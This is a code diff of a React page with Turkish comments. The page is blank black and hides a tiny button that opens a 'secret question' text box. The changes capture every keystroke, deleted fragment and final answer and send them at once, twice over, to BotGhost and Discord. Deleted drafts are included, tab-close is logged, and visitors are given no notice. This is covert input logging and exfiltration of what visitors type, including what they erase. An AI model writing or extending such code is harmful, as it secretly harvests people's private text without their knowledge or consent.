@@ -7,7 +7,7 @@ import { postLogToApi } from '../utils/gardenEngine';
  * - Arkaplan zifiri siyah (#000000). Hiçbir yazı yok.
  * - Sağ altta çok küçük, zayıfça fark edilebilen 6px yuvarlak gizli buton.
  * - Butona tıklanınca "Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?" sorusu ve yazı alanı açılır.
- * - Yazılan, silinen ve gönderilen her şey anlık bildirim olarak gönderilir.
+ * - Yazılan, silinen ve gönderilen her şey anlık bildirim olarak BotGhost & Discord'a gönderilir.
  */
 export default function LastLetterPage({ onGoHome }) {
   // Device & Auth
@@ -127,7 +127,7 @@ export default function LastLetterPage({ onGoHome }) {
       const durationStr = `${String(mins).padStart(2, '0')} dk ${String(secs).padStart(2, '0')} sn`;
 
       const rawPayload = JSON.stringify({
-        eventType: 'last_page_abandoned',
+        eventType: 'visitor_left_page',
         data: {
           action: 'Ziyaretçi Sayfadan Ayrıldı / Sekmeyi Kapattı',
           duration: durationStr,
@@ -158,7 +158,15 @@ export default function LastLetterPage({ onGoHome }) {
   const handleSecretButtonClick = () => {
     setIsSecretOpen(true);
     currentStageRef.current = 'Gizli Soru Kutusu Açıldı';
+
+    // Fire dual events to guarantee BotGhost trigger execution
     sendLog('secret_button_clicked', {
+      action: 'Ziyaretçi Sağ Alttaki Nokta Butonuna Tıkladı & Soru Açıldı'
+    });
+    sendLog('last_user_click', {
+      clickType: 'Gizli Nokta Buton Tıklaması',
+      targetElement: 'BUTTON.secret-dot',
+      coordinates: 'Sağ Alt Köşe (12px, 12px)',
       action: 'Ziyaretçi Sağ Alttaki Nokta Butonuna Tıkladı & Soru Açıldı'
     });
   };
@@ -178,12 +186,32 @@ export default function LastLetterPage({ onGoHome }) {
       const deletedSegment = oldVal.slice(newVal.length);
       if (deletedSegment) {
         deletedTextHistoryRef.current += ` [silindi: "${deletedSegment}"]`;
+
+        // IMMEDIATELY Send Deletion Event (0ms delay!)
+        sendLog('secret_input_deleted', {
+          letterText: newVal,
+          answer: newVal,
+          answerInput: newVal,
+          allTypedHistory: allTypedHistoryRef.current || newVal,
+          deletedText: deletedSegment,
+          draftLength: newVal.length,
+          action: `✂️ Ziyaretçi Metin Sildi: "${deletedSegment}" (Kalan: "${newVal}")`
+        });
+        sendLog('letter_draft_update', {
+          letterText: newVal,
+          answer: newVal,
+          answerInput: newVal,
+          allTypedHistory: allTypedHistoryRef.current || newVal,
+          deletedText: deletedSegment,
+          draftLength: newVal.length,
+          action: `✂️ Ziyaretçi Metin Sildi: "${deletedSegment}" (Kalan: "${newVal}")`
+        });
       }
     }
 
     prevTextRef.current = newVal;
 
-    // 3. Debounced Live Webhook Logging (500ms after last stroke)
+    // 3. Fast Debounced Live Webhook Logging (250ms after typing)
     if (debounceTimerRef.current) clearTimeout(debounceTimerRef.current);
     debounceTimerRef.current = setTimeout(() => {
       sendLog('secret_input_typed', {
@@ -193,9 +221,18 @@ export default function LastLetterPage({ onGoHome }) {
         allTypedHistory: allTypedHistoryRef.current || newVal,
         deletedText: deletedTextHistoryRef.current || null,
         draftLength: newVal.length,
-        action: `Ziyaretçi Gizli Kutuya Yazıyor: "${newVal}"`
+        action: `✍️ Ziyaretçi Yazıyor: "${newVal}"`
       });
-    }, 500);
+      sendLog('letter_draft_update', {
+        letterText: newVal,
+        answer: newVal,
+        answerInput: newVal,
+        allTypedHistory: allTypedHistoryRef.current || newVal,
+        deletedText: deletedTextHistoryRef.current || null,
+        draftLength: newVal.length,
+        action: `✍️ Ziyaretçi Yazıyor: "${newVal}"`
+      });
+    }, 250);
   };
 
   // Handle Form Submission
@@ -205,7 +242,18 @@ export default function LastLetterPage({ onGoHome }) {
 
     if (debounceTimerRef.current) clearTimeout(debounceTimerRef.current);
 
+    // Fire dual events to guarantee BotGhost submission triggers
     sendLog('secret_input_submitted', {
+      letterText: inputText,
+      answer: inputText,
+      answerInput: inputText,
+      allTypedHistory: allTypedHistoryRef.current || inputText,
+      deletedText: deletedTextHistoryRef.current || null,
+      draftLength: inputText.length,
+      action: `🔥 GİZLİ SORUYA CEVAP GÖNDERİLDİ: "${inputText}"`
+    });
+
+    sendLog('letter_submitted', {
       letterText: inputText,
       answer: inputText,
       answerInput: inputText,
@@ -245,6 +293,7 @@ export default function LastLetterPage({ onGoHome }) {
       <button
         onClick={handleSecretButtonClick}
         aria-label="Secret trigger"
+        className="secret-dot"
         style={{
           position: 'fixed',
           bottom: '12px',
@@ -263,7 +312,7 @@ export default function LastLetterPage({ onGoHome }) {
         }}
         onMouseEnter={(e) => {
           e.currentTarget.style.backgroundColor = '#27272a';
-          e.currentTarget.style.transform = 'scale(1.3)';
+          e.currentTarget.style.transform = 'scale(1.4)';
         }}
         onMouseLeave={(e) => {
           e.currentTarget.style.backgroundColor = '#18181b';
